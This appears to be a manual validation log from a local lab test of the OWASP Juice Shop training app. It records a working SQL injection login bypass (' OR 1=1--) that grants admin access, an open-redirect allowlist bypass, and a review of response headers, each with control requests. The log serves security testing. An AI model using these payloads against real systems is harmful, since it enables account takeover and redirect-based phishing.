# Manual validation log - local lab target only (http://127.0.0.1:3001)
Date (UTC): 2026-11-15T11:55:56Z  |  Target: Juice Shop {"version":"20.4.0-SNAPSHOT"}

## LAB-SAST-01 / SQL injection in routes/login.ts:34
$ POST /rest/user/login  {"email":"' OR 1=1--","password":"x"}
HTTP 200
authenticated as: admin@juice-sh.op | role: admin | token: [REDACTED - not stored]

Control - normal wrong password:
HTTP 401

## LAB-ZAP-04 / LAB-SAST-04 open redirect in routes/redirect.ts (allowlist uses includes())
$ GET /redirect?to=https://example.org/?pivot=https://github.com/juice-shop/juice-shop
HTTP 302 -> Location: https://example.org/?pivot=https://github.com/juice-shop/juice-shop
Control - unlisted URL:
HTTP 406

## LAB-ZAP-01/02/03 / response security headers on /
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
(Content-Security-Policy header: 0 present)
